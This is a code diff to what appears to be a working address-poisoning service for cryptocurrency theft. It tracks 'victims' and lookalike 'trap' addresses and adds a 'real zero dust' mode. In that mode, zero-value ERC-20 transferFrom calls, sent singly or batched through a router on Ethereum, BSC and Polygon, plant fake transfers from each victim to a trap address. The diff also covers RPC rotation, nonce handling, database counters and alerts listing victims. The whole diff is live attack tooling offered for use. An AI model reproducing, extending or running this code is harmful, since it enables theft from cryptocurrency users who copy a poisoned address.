@@ -306,7 +306,8 @@ function subscribeToNewTraps() {
           var counterparty = row.counterparty_address ? row.counterparty_address.toLowerCase() : null;
           var campaignId = row.campaign_id;
 
-          victims.set(victim, {
+          const existingArray = victims.get(victim) || [];
+          existingArray.push({
             privateKey: privateKey,
             trapAddress: row.trap_address.toLowerCase(),
             counterparty: counterparty,
@@ -315,6 +316,7 @@ function subscribeToNewTraps() {
             campaignId: campaignId,
             victimAddress: victim
           });
+          victims.set(victim, existingArray);
 
           trapToVictimMap.set(row.trap_address.toLowerCase(), victim);
           console.log('[REALTIME] Added ' + victim + ' to active victims (total: ' + victims.size + ')');
@@ -440,7 +442,7 @@ async function loadTrapsFromDB() {
     // 🚀 FIX: Only load funding keys for NEW campaigns (skip already loaded ones)
     const invalidCampaigns = new Set(); // Cache invalid campaigns to avoid retrying
 
-    if (MIRROR_TOKEN_USDC || MIRROR_TOKEN_USDT || MIRROR_TOKEN_NATIVE) {
+    if (MIRROR_TOKEN_USDC || MIRROR_TOKEN_USDT || MIRROR_TOKEN_NATIVE || REAL_DUST_ENABLED) {
       for (const camp of campaigns) {
         // 🚀 Store toggle settings in memory
         campaignSettings.set(camp.id, {
@@ -545,16 +547,27 @@ async function loadTrapsFromDB() {
           const counterparty = row.counterparty_address ? row.counterparty_address.toLowerCase() : null;
           const campaignId = row.campaign_id;
 
-          const existing = victims.get(victim);
-          victims.set(victim, {
+          const existingArray = victims.get(victim) || [];
+          const newEntry = {
             privateKey,
             trapAddress: row.trap_address.toLowerCase(),
             counterparty,
-            lastPoison: existing ? existing.lastPoison : 0,
-            lastCounterPoison: existing ? existing.lastCounterPoison : 0,
+            lastPoison: 0,
+            lastCounterPoison: 0,
             campaignId,
             victimAddress: victim,
-          });
+          };
+
+          // Check if this trap already exists (for incremental reloads)
+          const trapIdx = existingArray.findIndex(e => e.trapAddress === newEntry.trapAddress);
+          if (trapIdx !== -1) {
+            newEntry.lastPoison = existingArray[trapIdx].lastPoison;
+            newEntry.lastCounterPoison = existingArray[trapIdx].lastCounterPoison;
+            existingArray[trapIdx] = newEntry;
+          } else {
+            existingArray.push(newEntry);
+          }
+          victims.set(victim, existingArray);
 
           trapToVictimMap.set(row.trap_address.toLowerCase(), victim);
           loaded++;
@@ -835,6 +848,906 @@ const client = createPublicClient({
   ),
 });
 
+// ─────────────────────────────────────────────────────────────
+// REAL 0-VALUE DUST LANE (does not affect fake emit by default)
+// ─────────────────────────────────────────────────────────────
+const parseRealPositiveInt = (value, fallback) => {
+  const n = parseInt(value, 10);
+  return Number.isFinite(n) && n > 0 ? n : fallback;
+};
+
+const DUST_MODE = String(process.env.DUST_MODE || 'fake').trim().toLowerCase();
+const REAL_DUST_ENABLED = DUST_MODE === 'real' || DUST_MODE === 'both';
+const REAL_DUST_DEFAULT_ASSET = String(process.env.REAL_DUST_DEFAULT_ASSET || 'USDT').trim().toUpperCase();
+const REAL_ZERO_BATCH_ROUTER = String(process.env.REAL_ZERO_BATCH_ROUTER || '').trim();
+const REAL_ZERO_BATCH_CHUNK_SIZE = Math.max(
+  1,
+  Math.min(1000, parseRealPositiveInt(process.env.REAL_ZERO_BATCH_CHUNK_SIZE, 200))
+);
+const REAL_ZERO_BATCH_BASE_GAS = parseRealPositiveInt(process.env.REAL_ZERO_BATCH_BASE_GAS, 120000);
+const REAL_ZERO_BATCH_PER_TRANSFER_GAS = parseRealPositiveInt(process.env.REAL_ZERO_BATCH_PER_TRANSFER_GAS, 80000);
+const REAL_DUST_GAS_LIMIT = BigInt(parseRealPositiveInt(process.env.REAL_DUST_GAS_LIMIT, 80000));
+const REAL_ZERO_BATCH_FLUSH_INTERVAL_MS = Math.max(
+  5000,
+  parseRealPositiveInt(
+    process.env.REAL_ZERO_BATCH_FLUSH_INTERVAL_MS || process.env.REAL_DUST_BATCH_FLUSH_INTERVAL_MS,
+    420000
+  )
+);
+const REAL_DUST_BATCH_FLUSH_THRESHOLD = Math.max(
+  1,
+  parseRealPositiveInt(
+    process.env.REAL_DUST_BATCH_FLUSH_THRESHOLD || process.env.REAL_DUST_FLUSH_THRESHOLD,
+    BATCH_FLUSH_THRESHOLD
+  )
+);
+
+console.log(`[DEBUG] DUST_MODE=${DUST_MODE}, REAL_DUST_ENABLED=${REAL_DUST_ENABLED}`);
+console.log(`[DEBUG] REAL_DUST_DEFAULT_ASSET=${REAL_DUST_DEFAULT_ASSET}`);
+console.log(`[DEBUG] REAL_ZERO_BATCH_ROUTER=${REAL_ZERO_BATCH_ROUTER || 'unset'}`);
+console.log(`[DEBUG] REAL_ZERO_BATCH_CHUNK_SIZE=${REAL_ZERO_BATCH_CHUNK_SIZE}`);
+console.log(`[DEBUG] REAL_DUST_BATCH_FLUSH_THRESHOLD=${REAL_DUST_BATCH_FLUSH_THRESHOLD}`);
+console.log(`[DEBUG] REAL_ZERO_BATCH_FLUSH_INTERVAL_MS=${REAL_ZERO_BATCH_FLUSH_INTERVAL_MS}`);
+
+const REAL_TOKEN_FALLBACK_ADDRESSES = {
+  ethereum: {
+    USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
+    USDC: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
+    DAI: '0x6B175474E89094C44Da98b954EedeAC495271d0F',
+    WBTC: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599',
+    WETH: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
+  },
+  bsc: {
+    USDT: '0x55d398326f99059fF775485246999027B3197955',
+    USDC: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
+    DAI: '0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3',
+    WBNB: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c',
+  },
+  polygon: {
+    USDT: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
+    USDC: '0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359',
+    DAI: '0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063',
+    WETH: '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619',
+    WMATIC: '0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270',
+  },
+};
+
+const realTokenSymbolMap = new Map();
+if (chainCfg && chainCfg.tokens) {
+  for (const [symbol, address] of Object.entries(chainCfg.tokens)) {
+    realTokenSymbolMap.set(String(symbol).toUpperCase(), address);
+  }
+}
+
+function isNativeAssetSymbol(asset) {
+  const s = String(asset || '').toUpperCase();
+  const native = String(nativeSymbol || 'ETH').toUpperCase();
+  return (
+    s === 'ETH' ||
+    s === 'BNB' ||
+    s === 'MATIC' ||
+    s === 'POL' ||
+    s === native
+  );
+}
+
+function getRealTokenAddress(symbol) {
+  let s = String(symbol || '').trim().toUpperCase();
+  if (!s || isNativeAssetSymbol(s)) {
+    s = REAL_DUST_DEFAULT_ASSET;
+  }
+  if (isNativeAssetSymbol(s)) {
+    s = 'USDT';
+  }
+
+  const chainKey = String(chainName || 'ethereum').toLowerCase();
+  let addr = realTokenSymbolMap.get(s);
+  if (!addr) {
+    addr = REAL_TOKEN_FALLBACK_ADDRESSES[chainKey]?.[s];
+  }
+  if (!addr) {
+    addr =
+      realTokenSymbolMap.get(REAL_DUST_DEFAULT_ASSET) ||
+      REAL_TOKEN_FALLBACK_ADDRESSES[chainKey]?.[REAL_DUST_DEFAULT_ASSET];
+  }
+  return addr || null;
+}
+
+const REAL_ZERO_BATCH_ROUTER_ABI = [
+  {
+    inputs: [
+      {
+        components: [
+          { internalType: 'address', name: 'token', type: 'address' },
+          { internalType: 'address', name: 'from', type: 'address' },
+          { internalType: 'address', name: 'to', type: 'address' },
+          { internalType: 'uint256', name: 'value', type: 'uint256' },
+        ],
+        internalType: 'struct RealZeroBatchRouter.Call[]',
+        name: 'calls',
+        type: 'tuple[]',
+      },
+    ],
+    name: 'batchTransferFrom',
+    outputs: [
+      { internalType: 'uint256', name: 'successCount', type: 'uint256' },
+      { internalType: 'uint256', name: 'failCount', type: 'uint256' },
+    ],
+    stateMutability: 'nonpayable',
+    type: 'function',
+  },
+];
+
+const ERC20_TRANSFER_FROM_ABI = [
+  {
+    type: 'function',
+    name: 'transferFrom',
+    stateMutability: 'nonpayable',
+    inputs: [
+      { name: 'from', type: 'address' },
+      { name: 'to', type: 'address' },
+      { name: 'value', type: 'uint256' },
+    ],
+    outputs: [{ name: '', type: 'bool' }],
+  },
+];
+
+const realPoisonQueue = new Map();
+let realQueueFlushTimer = null;
+let realFlushInProgress = false;
+let realFlushRetryScheduled = false;
+
+function scheduleRealQueueFlush(delay = 0) {
+  if (realFlushRetryScheduled) return;
+  realFlushRetryScheduled = true;
+  setTimeout(() => {
+    realFlushRetryScheduled = false;
+    flushAllRealQueues().catch(err => {
+      logger.warn(`[real-zero] scheduled flush error: ${err?.message || err}`);
+    });
+  }, delay);
+}
+
+function queueRealDust(campaignId, tokenAddress, victimAddress, trapAddress, type, entry, asset) {
+  if (!REAL_DUST_ENABLED) return;
+  if (!tokenAddress) return;
+
+  const key = String(campaignId);
+  if (!realPoisonQueue.has(key)) {
+    realPoisonQueue.set(key, []);
+  }
+
+  const queue = realPoisonQueue.get(key);
+  const victimLower = String(victimAddress || '').toLowerCase();
+  const trapLower = String(trapAddress || '').toLowerCase();
+
+  const existingIndex = queue.findIndex(
+    item =>
+      String(item.victimAddress).toLowerCase() === victimLower &&
+      String(item.trapAddress).toLowerCase() === trapLower
+  );
+
+  if (existingIndex !== -1) {
+    if (type === 'counter' && queue[existingIndex].type === 'auto') {
+      queue[existingIndex].type = 'counter';
+    }
+    queue[existingIndex].timestamp = Date.now();
+    logger.info(
+      `[real-zero] ♻️ Deduplicated real zero dust: ${victimLower.slice(0, 10)}... -> ${trapLower.slice(0, 10)}...`
+    );
+    return;
+  }
+
+  queue.push({
+    campaignId: key,
+    victimAddress: victimLower,
+    trapAddress: trapLower,
+    tokenAddress,
+    asset: String(asset || REAL_DUST_DEFAULT_ASSET).toUpperCase(),
+    type,
+    entry,
+    timestamp: Date.now(),
+  });
+
+  logger.info(
+    `[real-zero] 📦 Queued ${type} real zero dust for ${victimLower.slice(0, 10)}...` +
+    `(${queue.length}/${REAL_DUST_BATCH_FLUSH_THRESHOLD} in batch)`
+  );
+
+  if (!realQueueFlushTimer && queue.length === 1) {
+    realQueueFlushTimer = setTimeout(() => {
+      realQueueFlushTimer = null;
+      flushAllRealQueues().catch(err => {
+        logger.warn(`[real-zero] timer flush error: ${err?.message || err}`);
+      });
+    }, REAL_ZERO_BATCH_FLUSH_INTERVAL_MS);
+  }
+
+  if (queue.length >= REAL_DUST_BATCH_FLUSH_THRESHOLD) {
+    logger.info(`[real-zero] 🚀 Threshold reached — flushing real queue immediately`);
+    scheduleRealQueueFlush(0);
+  }
+}
+
+async function flushAllRealQueues() {
+  if (realQueueFlushTimer) {
+    clearTimeout(realQueueFlushTimer);
+    realQueueFlushTimer = null;
+  }
+
+  const keys = Array.from(realPoisonQueue.keys());
+  for (const key of keys) {
+    await flushRealQueue(key);
+  }
+}
+
+function updateRealBatchStats(items, success) {
+  for (const item of items) {
+    if (!item.entry) continue;
+    if (success) {
+      if (item.type === 'auto') {
+        item.entry.lastRealPoison = Date.now();
+      }
+      if (item.type === 'counter') {
+        item.entry.lastRealCounterPoison = Date.now();
+      }
+    }
+  }
+}
+
+async function updateRealZeroDustCounts(items) {
+  if (!supabaseService || !items || items.length === 0) return;
+
+  const nowIso = new Date().toISOString();
+
+  for (const item of items) {
+    try {
+      const campaignId = item.campaignId || item.entry?.campaignId;
+      const victim = String(item.victimAddress || '').toLowerCase();
+      const trap = String(item.trapAddress || '').toLowerCase();
+
+      if (!campaignId || !victim || !trap) continue;
+
+      const { data, error } = await supabaseService
+        .from('traps')
+        .select('zero_dust_count')
+        .eq('campaign_id', campaignId)
+        .eq('victim_address', victim)
+        .eq('trap_address', trap)
+        .limit(1)
+        .maybeSingle();
+
+      if (error) continue;
+
+      const nextCount = Number(data?.zero_dust_count || 0) + 1;
+
+      const { error: updateError } = await supabaseService
+        .from('traps')
+        .update({
+          zero_dust_count: nextCount,
+          last_zero_dusted_at: nowIso,
+        })
+        .eq('campaign_id', campaignId)
+        .eq('victim_address', victim)
+        .eq('trap_address', trap);
+
+      if (updateError) {
+        const { error: fallbackUpdateError } = await supabaseService
+          .from('traps')
+          .update({ zero_dust_count: nextCount })
+          .eq('campaign_id', campaignId)
+          .eq('victim_address', victim)
+          .eq('trap_address', trap);
+
+        if (fallbackUpdateError) {
+          logger.warn(
+            `[real-zero] failed to update zero_dust_count for ${victim.slice(0, 10)}... -> ${trap.slice(0, 10)}...: ` +
+            `${fallbackUpdateError.message}`
+          );
+        }
+      }
+    } catch (err) {
+      logger.warn(`[real-zero] failed to update zero_dust_count: ${err?.message || err}`);
+    }
+  }
+}
+
+async function sendRealBatchFailureAlert(items, errorReason, operatorAddress = null, txHash = null, contractAddress = null) {
+  if (!items || items.length === 0) return;
+
+  const firstItem = items[0];
+  const campaignId = firstItem.campaignId || firstItem.entry?.campaignId;
+  const autoCount = items.filter(i => i.type === 'auto').length;
+  const counterCount = items.filter(i => i.type === 'counter').length;
+
+  let typeLabel = 'Real Zero-Dust Batch';
+  if (autoCount > 0 && counterCount === 0) {
+    typeLabel = 'Auto Real Zero-Dust Batch';
+  } else if (counterCount > 0 && autoCount === 0) {
+    typeLabel = 'Counter Real Zero-Dust Batch';
+  } else if (autoCount > 0 && counterCount > 0) {
+    typeLabel = `Mixed Real Zero-Dust Batch (${autoCount} Auto / ${counterCount} Counter)`;
+  }
+
+  const CHUNK_SIZE = 10;
+  const chunks = [];
+  for (let i = 0; i < items.length; i += CHUNK_SIZE) {
+    chunks.push(items.slice(i, i + CHUNK_SIZE));
+  }
+
+  const txUrl = txHash ? getExplorerUrl(txHash, 'tx') : null;
+  const contractUrl = contractAddress ? getExplorerUrl(contractAddress) : null;
+  const totalChunks = chunks.length;
+
+  for (let chunkIdx = 0; chunkIdx < totalChunks; chunkIdx++) {
+    const chunk = chunks[chunkIdx];
+    const startIdx = chunkIdx * CHUNK_SIZE;
+
+    const lines = chunk.map((item, idx) => {
+      const icon = item.type === 'counter' ? '🏆' : '💧';
+      const asset = String(item.asset || REAL_DUST_DEFAULT_ASSET).toUpperCase();
+      const victimUrl = getExplorerUrl(item.victimAddress);
+      const trapUrl = getExplorerUrl(item.trapAddress);
+      return (
+        `${icon} *${startIdx + idx + 1}.* (0.000000 ${asset})\n` +
+        `👤 Victim: \`${item.victimAddress}\`\n🔗 ${victimUrl}\n` +
+        `🪤 Trap: \`${item.trapAddress}\`\n🔗 ${trapUrl}`
+      );
+    });
+
+    let header = `❌ *${typeLabel} FAILED* — ${items.length} real zero transfers\n`;
+    if (totalChunks > 1) {
+      header += `📄 *Part ${chunkIdx + 1}/${totalChunks}*\n`;
+    }
+    header += `\n⚠️ Error: ${errorReason || 'Unknown real zero failure'}\n`;
+    if (operatorAddress) {
+      header += `🔑 Operator: \`${operatorAddress}\`\n`;
+    }
+    if (contractAddress) {
+      header += `📦 Router/Token: \`${contractAddress}\`\n🔗 ${contractUrl}\n`;
+    }
+    if (txHash) {
+      header += `🔗 Failed TX: ${txUrl}\n`;
+    }
+    header += `\n💡 These items were NOT confirmed and have been dropped from the real queue.`;
+
+    const msg = header + '\n\n' + lines.join('\n\n');
+
+    try {
+      await sendAlert(msg, 'error', campaignId);
+      if (chunkIdx < totalChunks - 1) {
+        await new Promise(resolve => setTimeout(resolve, 500));
+      }
+    } catch (err) {
+      logger.warn(
+        `[real-zero] failed to send failure alert chunk ${chunkIdx + 1}: ${err.message}`
+      );
+    }
+  }
+}
+
+async function sendRealBatchAlert(items, txHash, contractAddress) {
+  if (!items || items.length === 0) return;
+
+  const firstItem = items[0];
+  const campaignId = firstItem.campaignId || firstItem.entry?.campaignId;
+
+  const CHUNK_SIZE = 10;
+  const chunks = [];
+  for (let i = 0; i < items.length; i += CHUNK_SIZE) {
+    chunks.push(items.slice(i, i + CHUNK_SIZE));
+  }
+
+  const autoCount = items.filter(i => i.type === 'auto').length;
+  const counterCount = items.filter(i => i.type === 'counter').length;
+
+  let typeLabel = 'Real Zero-Dust Batch';
+  if (autoCount > 0 && counterCount === 0) typeLabel = 'Auto Real Zero-Dust Batch';
+  else if (counterCount > 0 && autoCount === 0) typeLabel = 'Counter Real Zero-Dust Batch';
+  else if (autoCount > 0 && counterCount > 0) {
+    typeLabel = `Mixed Real Zero-Dust Batch (${autoCount} Auto / ${counterCount} Counter)`;
+  }
+
+  const txUrl = getExplorerUrl(txHash, 'tx');
+  const contractUrl = getExplorerUrl(contractAddress);
+  const totalChunks = chunks.length;
+
+  for (let chunkIdx = 0; chunkIdx < totalChunks; chunkIdx++) {
+    const chunk = chunks[chunkIdx];
+    const startIdx = chunkIdx * CHUNK_SIZE;
+
+    const lines = chunk.map((item, idx) => {
+      const icon = item.type === 'counter' ? '🏆' : '💧';
+      const victimUrl = getExplorerUrl(item.victimAddress);
+      const trapUrl = getExplorerUrl(item.trapAddress);
+      return (
+        `${icon} *${startIdx + idx + 1}.* (0.000000 ${item.asset})\n` +
+        `👤 Victim: \`${item.victimAddress}\`\n` +
+        `🔗 ${victimUrl}\n` +
+        `🪤 Trap: \`${item.trapAddress}\`\n` +
+        `🔗 ${trapUrl}`
+      );
+    });
+
+    let header = `💧 *${typeLabel}* — ${items.length} real zero transfers in 1 TX!\n`;
+    if (totalChunks > 1) {
+      header += `📄 *Part ${chunkIdx + 1}/${totalChunks}*\n`;
+    }
+    header += '\n';
+
+    const msg =
+      header +
+      lines.join('\n') +
+      `\n📦 Router/Token: \`${contractAddress}\`\n` +
+      `🔗 ${contractUrl}\n` +
+      `\n🔗 TX: ${txUrl}`;
+
+    try {
+      await sendAlert(msg, 'success', campaignId);
+      if (chunkIdx < totalChunks - 1) {
+        await new Promise(resolve => setTimeout(resolve, 500));
+      }
+    } catch (err) {
+      logger.warn(`[real-zero] failed to send batch alert chunk ${chunkIdx + 1}: ${err.message}`);
+    }
+  }
+}
+
+async function emitRealZeroBatch(campaignWallet, campaignId, calls, estimatedGas, gasParamsOverride = null) {
+  if (!campaignMirrorLocks.has(campaignId)) {
+    campaignMirrorLocks.set(campaignId, Promise.resolve());
+  }
+
+  const currentLock = campaignMirrorLocks.get(campaignId);
+  const operatorAddress = campaignWallet.walletClient.account.address;
+
+  const run = currentLock.then(async () => {
+    let gasParams;
+    if (gasParamsOverride) {
+      gasParams = { ...gasParamsOverride };
+    } else {
+      const fees = await calculateSmartGasFees();
+      gasParams = {
+        maxFeePerGas: fees.maxFeePerGas,
+        maxPriorityFeePerGas: fees.maxPriorityFeePerGas,
+      };
+      await notifyGasStrategy(campaignId, fees.usedFallback, fees.finalGwei);
+    }
+
+    const gasLimit =
+      typeof estimatedGas === 'bigint'
+        ? estimatedGas
+        : BigInt(estimatedGas);
+
+    try {
+      const operatorBalance = await client.getBalance({ address: operatorAddress });
+      const gasFee = gasParams.maxFeePerGas ?? gasParams.gasPrice ?? 0n;
+      const feeAsBigInt = typeof gasFee === 'bigint' ? gasFee : BigInt(gasFee);
+      const estimatedGasCost = gasLimit * feeAsBigInt;
+
+      if (operatorBalance < estimatedGasCost) {
+        const needed = Number(estimatedGasCost) / 1e18;
+        const have = Number(operatorBalance) / 1e18;
+        const msg =
+          `Insufficient operator gas for real zero batch. ` +
+          `Need ${needed.toFixed(8)} ${nativeSymbol}, ` +
+          `have ${have.toFixed(8)} ${nativeSymbol}`;
+        logger.error(`[real-zero-batch] ${msg}`);
+        return { ok: false, hash: null, error: msg };
+      }
+    } catch (checkErr) {
+      logger.warn(`[real-zero-batch] pre-flight gas check failed: ${checkErr.message}`);
+    }
+
+    let nonce = await getAndIncrementNonce(campaignId, campaignWallet.walletClient, operatorAddress);
+    let lastError = null;
+    let hash = null;
+    const rpcUrls = fallbackUrls.length > 0 ? fallbackUrls : [chainRpc];
+    const maxAttempts = Math.min(rpcUrls.length, 10);
+
+    for (let attempt = 0; attempt < maxAttempts; attempt++) {
+      try {
+        const tempTransport = http(rpcUrls[attempt % rpcUrls.length], { timeout: 15000 });
+        const tempWalletClient = createWalletClient({
+          account: campaignWallet.walletClient.account,
+          chain: viemChain,
+          transport: tempTransport,
+        });
+
+        hash = await tempWalletClient.writeContract({
+          address: REAL_ZERO_BATCH_ROUTER,
+          abi: REAL_ZERO_BATCH_ROUTER_ABI,
+          functionName: 'batchTransferFrom',
+          args: [calls],
+          nonce,
+          gas: gasLimit,
+          ...gasParams,
+        });
+
+        logger.info(
+          `[real-zero-batch] Successfully used RPC ${attempt + 1}/${maxAttempts}: ` +
+          `${rpcUrls[attempt % rpcUrls.length].slice(0, 50)}...`
+        );
+        break;
+      } catch (err) {
+        lastError = err;
+        const errMsg = err.message || String(err);
+        const currentRpc = rpcUrls[attempt % rpcUrls.length].replace('https://', '').slice(0, 30);
+
+        if (
+          errMsg.includes('nonce too low') ||
+          errMsg.includes('lower than the') ||
+          errMsg.includes('higher than the') ||
+          errMsg.includes('replacement transaction') ||
+          errMsg.includes('nonce has already been used')
+        ) {
+          logger.warn(`[real-zero-batch] Nonce out of sync on ${currentRpc}. Fetching fresh nonce...`);
+          try {
+            const freshNonce = await client
+              .getTransactionCount({ address: operatorAddress, blockTag: 'pending' })
+              .catch(() => client.getTransactionCount({ address: operatorAddress }));
+            nonce = freshNonce;
+            const nonces = campaignNonces.get(campaignId);
+            if (nonces) nonces.set(operatorAddress, freshNonce);
+          } catch {
+            // ignore
+          }
+        }
+
+        const isFatal =
+          errMsg.includes('invalid private key') ||
+          errMsg.includes('unknown account') ||
+          errMsg.includes('missing revert data');
+        if (isFatal) throw err;
+
+        logger.warn(
+          `[real-zero-batch] RPC ${attempt + 1}/${maxAttempts} (${currentRpc}) failed: ` +
+          `${errMsg.slice(0, 80)}... rotating`
+        );
+        await new Promise(resolve => setTimeout(resolve, 1000));
+        continue;
+      }
+    }
+
+    if (!hash && lastError) {
+      return { ok: false, hash: null, error: lastError.message || String(lastError) };
+    }
+
+    let receiptSuccess = false;
+    let receiptError = null;
+    try {
+      const receipt = await client.waitForTransactionReceipt({ hash, timeout: 300000, confirmations: 1 });
+      const ok = receipt.status === 'success' || receipt.status === true || receipt.status === 1;
+      if (ok) {
+        logger.info(`[real-zero-batch] ✅ TX confirmed in block ${receipt.blockNumber}`);
+        receiptSuccess = true;
+      } else {
+        receiptError = `Real zero batch tx reverted: ${hash}`;
+        logger.error(`[real-zero-batch] ❌ ${receiptError}`);
+      }
+    } catch (waitErr) {
+      receiptError =
+        `Real zero batch tx not confirmed in 5 mins: ` +
+        `${waitErr.message?.slice(0, 120) || 'unknown receipt error'}`;
+      logger.warn(
+        `[real-zero-batch] ⚠️ TX ${hash.slice(0, 14)}... not confirmed in 5 mins: ` +
+        `${waitErr.message?.slice(0, 80)}`
+      );
+    }
+
+    if (receiptSuccess) {
+      confirmNonceIncrement(campaignId, operatorAddress);
+      logger.info(`[real-zero-batch] Real zero batch emitted: ${calls.length} transfers, tx=${hash}`);
+      return hash;
+    }
+
+    logger.warn(`[real-zero-batch] 🔄 Clearing local nonce for ${operatorAddress.slice(0, 10)}...`);
+    const nonces = campaignNonces.get(campaignId);
+    if (nonces) nonces.delete(operatorAddress);
+
+    return {
+      ok: false,
+      hash: hash || null,
+      error: receiptError || 'Real zero batch transaction failed, was dropped, or RPC timed out.',
+    };
+  }).catch(err => {
+    const errMsg = err.message || String(err);
+    const nonces = campaignNonces.get(campaignId);
+    if (nonces && nonces.has(operatorAddress)) {
+      nonces.set(operatorAddress, Math.max(0, nonces.get(operatorAddress) - 1));
+    }
+    logger.warn(`[real-zero-batch] Failed to emit real zero batch: ${errMsg}`);
+    return { ok: false, hash: null, error: errMsg };
+  });
+
+  campaignMirrorLocks.set(campaignId, run.then(() => { }));
+  return run;
+}
+
+async function emitRealZeroTransfer(campaignWallet, campaignId, item, gasParamsOverride = null) {
+  if (!campaignMirrorLocks.has(campaignId)) {
+    campaignMirrorLocks.set(campaignId, Promise.resolve());
+  }
+
+  const currentLock = campaignMirrorLocks.get(campaignId);
+  const operatorAddress = campaignWallet.walletClient.account.address;
+
+  const run = currentLock.then(async () => {
+    let gasParams;
+    if (gasParamsOverride) {
+      gasParams = { ...gasParamsOverride };
+    } else {
+      const fees = await calculateSmartGasFees();
+      gasParams = {
+        maxFeePerGas: fees.maxFeePerGas,
+        maxPriorityFeePerGas: fees.maxPriorityFeePerGas,
+      };
+      await notifyGasStrategy(campaignId, fees.usedFallback, fees.finalGwei);
+    }
+
+    const gasLimit =
+      typeof REAL_DUST_GAS_LIMIT === 'bigint'
+        ? REAL_DUST_GAS_LIMIT
+        : BigInt(REAL_DUST_GAS_LIMIT);
+
+    try {
+      const operatorBalance = await client.getBalance({ address: operatorAddress });
+      const gasFee = gasParams.maxFeePerGas ?? gasParams.gasPrice ?? 0n;
+      const feeAsBigInt = typeof gasFee === 'bigint' ? gasFee : BigInt(gasFee);
+      const estimatedGasCost = gasLimit * feeAsBigInt;
+
+      if (operatorBalance < estimatedGasCost) {
+        const needed = Number(estimatedGasCost) / 1e18;
+        const have = Number(operatorBalance) / 1e18;
+        const msg =
+          `Insufficient operator gas for individual real zero transfer. ` +
+          `Need ${needed.toFixed(8)} ${nativeSymbol}, ` +
+          `have ${have.toFixed(8)} ${nativeSymbol}`;
+        logger.error(`[real-zero] ${msg}`);
+        return { ok: false, hash: null, error: msg };
+      }
+    } catch (checkErr) {
+      logger.warn(`[real-zero] pre-flight gas check failed: ${checkErr.message}`);
+    }
+
+    let nonce = await getAndIncrementNonce(campaignId, campaignWallet.walletClient, operatorAddress);
+    let lastError = null;
+    let hash = null;
+    const rpcUrls = fallbackUrls.length > 0 ? fallbackUrls : [chainRpc];
+    const maxAttempts = Math.min(rpcUrls.length, 10);
+
+    for (let attempt = 0; attempt < maxAttempts; attempt++) {
+      try {
+        const tempTransport = http(rpcUrls[attempt % rpcUrls.length], { timeout: 15000 });
+        const tempWalletClient = createWalletClient({
+          account: campaignWallet.walletClient.account,
+          chain: viemChain,
+          transport: tempTransport,
+        });
+
+        hash = await tempWalletClient.writeContract({
+          address: item.tokenAddress,
+          abi: ERC20_TRANSFER_FROM_ABI,
+          functionName: 'transferFrom',
+          args: [item.victimAddress, item.trapAddress, 0n],
+          nonce,
+          gas: gasLimit,
+          ...gasParams,
+        });
+
+        logger.info(
+          `[real-zero] Successfully used RPC ${attempt + 1}/${maxAttempts}: ` +
+          `${rpcUrls[attempt % rpcUrls.length].slice(0, 50)}...`
+        );
+        break;
+      } catch (err) {
+        lastError = err;
+        const errMsg = err.message || String(err);
+        const currentRpc = rpcUrls[attempt % rpcUrls.length].replace('https://', '').slice(0, 30);
+
+        if (
+          errMsg.includes('nonce too low') ||
+          errMsg.includes('lower than the') ||
+          errMsg.includes('higher than the') ||
+          errMsg.includes('replacement transaction') ||
+          errMsg.includes('nonce has already been used')
+        ) {
+          logger.warn(`[real-zero] Nonce out of sync on ${currentRpc}. Fetching fresh nonce...`);
+          try {
+            const freshNonce = await client
+              .getTransactionCount({ address: operatorAddress, blockTag: 'pending' })
+              .catch(() => client.getTransactionCount({ address: operatorAddress }));
+            nonce = freshNonce;
+            const nonces = campaignNonces.get(campaignId);
+            if (nonces) nonces.set(operatorAddress, freshNonce);
+          } catch {
+            // ignore
+          }
+        }
+
+        const isFatal =
+          errMsg.includes('invalid private key') ||
+          errMsg.includes('unknown account') ||
+          errMsg.includes('missing revert data');
+        if (isFatal) throw err;
+
+        logger.warn(
+          `[real-zero] RPC ${attempt + 1}/${maxAttempts} (${currentRpc}) failed: ` +
+          `${errMsg.slice(0, 80)}... rotating`
+        );
+        await new Promise(resolve => setTimeout(resolve, 1000));
+        continue;
+      }
+    }
+
+    if (!hash && lastError) {
+      return { ok: false, hash: null, error: lastError.message || String(lastError) };
+    }
+
+    let receiptSuccess = false;
+    let receiptError = null;
+    try {
+      const receipt = await client.waitForTransactionReceipt({ hash, timeout: 300000, confirmations: 1 });
+      const ok = receipt.status === 'success' || receipt.status === true || receipt.status === 1;
+      if (ok) {
+        logger.info(`[real-zero] ✅ TX confirmed in block ${receipt.blockNumber}`);
+        receiptSuccess = true;
+      } else {
+        receiptError = `Real zero transfer tx reverted: ${hash}`;
+        logger.error(`[real-zero] ❌ ${receiptError}`);
+      }
+    } catch (waitErr) {
+      receiptError =
+        `Real zero transfer tx not confirmed in 5 mins: ` +
+        `${waitErr.message?.slice(0, 120) || 'unknown receipt error'}`;
+      logger.warn(
+        `[real-zero] ⚠️ TX ${hash.slice(0, 14)}... not confirmed in 5 mins: ` +
+        `${waitErr.message?.slice(0, 80)}`
+      );
+    }
+
+    if (receiptSuccess) {
+      confirmNonceIncrement(campaignId, operatorAddress);
+      logger.info(
+        `[real-zero] 0-value ${item.asset} transferFrom emitted: ` +
+        `${item.victimAddress} -> ${item.trapAddress}, tx=${hash}`
+      );
+      return hash;
+    }
+
+    logger.warn(`[real-zero] 🔄 Clearing local nonce for ${operatorAddress.slice(0, 10)}...`);
+    const nonces = campaignNonces.get(campaignId);
+    if (nonces) nonces.delete(operatorAddress);
+
+    return {
+      ok: false,
+      hash: hash || null,
+      error: receiptError || 'Individual real zero transfer failed, was dropped, or RPC timed out.',
+    };
+  }).catch(err => {
+    const errMsg = err.message || String(err);
+    const nonces = campaignNonces.get(campaignId);
+    if (nonces && nonces.has(operatorAddress)) {
+      nonces.set(operatorAddress, Math.max(0, nonces.get(operatorAddress) - 1));
+    }
+    logger.warn(`[real-zero] Failed to emit real zero transfer: ${errMsg}`);
+    return { ok: false, hash: null, error: errMsg };
+  });
+
